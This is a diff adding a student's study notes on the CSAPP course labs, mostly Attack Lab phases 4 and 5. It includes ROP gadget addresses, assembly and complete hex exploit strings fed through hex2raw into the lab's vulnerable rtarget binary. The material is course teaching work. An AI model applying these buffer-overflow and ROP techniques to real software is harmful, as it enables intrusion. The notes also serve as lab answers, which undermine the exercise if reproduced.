@@ -1,6 +1,34 @@
 # CSAPP - Computer System
 
-## Lab1
+## Lab1 - Data Lab (C bitwise operations)
+
+How to setup the test environment.
+
+How to open VS code on WSL2. -> Open Docker Desktop. On Vs code, type remote container
+
+## For lab1. Data lab1.
+
+cd ~
+
+ls
+
+cd csapplab
+
+cd datalab/datalab-handout
+
+make clean **&&** make **&&** ./btest
+
+ 
+
+Notes:
+
+Q1. BitXor;
+
+![XOR Gate Truth Table, Symbol, Diagram, Application, Properties](CSAPP.assets/clip_image002.png)
+
+Ideas: First find the OR gate of two inputs, flip them use not then and them. And the initial two inputs and not the output then finally and the two values. 
+
+
 
 ### Floating point:
 
@@ -73,7 +101,7 @@ The idea is to apply the concept that when converting from the binary int to the
 
 
 
-## Lab2
+## Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)
 
 ![image-20240523224807402](CSAPP.assets/image-20240523224807402.png)
 
@@ -709,6 +737,161 @@ In x86-64 assembly, registers like `%eax` do not have a fixed memory address bec
 
 
 
-## Lab3
+## Lab3 - Attack lab(Code Injection and ROP attack)
 
- 
+ ![image-20240610013516973](CSAPP.assets/image-20240610013516973.png)
+
+![image-20240610013526450](CSAPP.assets/image-20240610013526450.png)
+
+![image-20240610013535692](CSAPP.assets/image-20240610013535692.png)
+
+
+
+### Understanding the `rdi` Register and Parameter Passing
+
+1. **Scalar Values (e.g., integers, floats):**
+   - If the parameter is a scalar value (such as an integer or a float), the actual value is stored directly in the `rdi` register.
+   - For example, if you pass an integer value `42` to a function, `rdi` will contain `42`.
+2. **Pointers (e.g., strings, arrays, structs):**
+   - If the parameter is a pointer (such as a string, array, or a struct), the `rdi` register will contain the address of the memory location where the actual data is stored.
+   - For example, if you pass a string `"hello"` to a function, `rdi` will contain the address of the first character of the string in memory.
+
+### Phase4
+
+ROP attack -> in the code instruction set, each code segment that ends with the return (c3) can be named as gadget.
+
+To design, the asm code can be followed from the previous phase2.
+
+usual way is we can move the cookie to the stack, and move the stack to the rdi, and push the function address and return. In this case, since we are going to use the code section, we can use rax to pass the cookie.
+
+So the ASM will be:
+
+```assembly
+pop rax	;58
+ret
+//pass the cookie
+mov rax, rdi	;48 89 c7
+ret
+//call the function
+```
+
+
+
+```assembly
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+
+;4019a7 + 4 = 4019ab // ab 19 40
+;pass the cookie as rax // fa 97 b9 59
+;move rax,rdi // 4019a2 // a2 19 40
+;then push the function of touch2 //ec 17 40
+
+
+```
+
+
+
+```cmd
+./hex2raw < 4ansmyown.txt | ./rtarget -q
+
+cmd to run
+```
+
+
+
+**Summary:**
+
+- Starting the index at an address means the disassembler will interpret the bytes from that point as a complete instruction.
+- The disassembler decodes each instruction in sequence until it reaches the end of the function or another stopping point.
+- For `mov` or any other instructions, it decodes the entire instruction set starting from the given address.
+
+**Important Points from lab manual:**
+
+- Your exploit string must not contain byte value 0x0a at any intermediate position, since this is the ASCII code for newline (‘\n’). When Gets encounters this byte, it will assume you intended to terminate the string. 
+- HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte ordering).
+
+
+
+### Phase5
+
+The cookie in ASCII is: `35 39 62 39 39 37 66 61 00`
+
+Old way is to pass the cookie as an rax into the register and move it into the stack memory address and called the memory address.
+
+```assembly
+\\\from phase_3, 0000000000000000 <.text>:
+   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq   
+   
+48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00		;the stack address of the previous
+35 39 62 39 39 37 66 61		;store this cookie on the test stack
+00
+```
+
+
+
+```assembly
+Idea is to make sure there is enough stack address that was able to get used in this case
+
+
+;use below instructions to load the stack address of the rdi, rsi will be used to set as an offset
+000000000000006a <add_xy>:
+  6a:	f3 0f 1e fa          	endbr64 
+  6e:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  72:	c3                   	retq   
+  
+; From the farm.asm file, only the instruction movl ecx,esi is being found, so we can only use this and pass around the registers
+; next find only the 
+mov edx, ecx
+mov eax, edx
+// after adding bias.
+pop rax,
+mov rax, rdi	;rdi will be the top address of the stack on test
+mov rsp, rax
+
+
+```
+
+![image-20240617002317736](CSAPP.assets/image-20240617002317736.png)
+
+```
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+cc 19 40 00 00 00 00 00 
+48 00 00 00 00 00 00 00 
+dd 19 40 00 00 00 00 00 
+70 1a 40 00 00 00 00 00 
+13 1a 40 00 00 00 00 00 
+d6 19 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+fa 18 40 00 00 00 00 00 
+35 39 62 39 39 37 66 61 00
+```
+
+
+
+### References:
+
+https://www.jianshu.com/p/db731ca57342
+
+https://zhuanlan.zhihu.com/p/60724948
+
+https://blog.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-5.html
+
+## Lab4
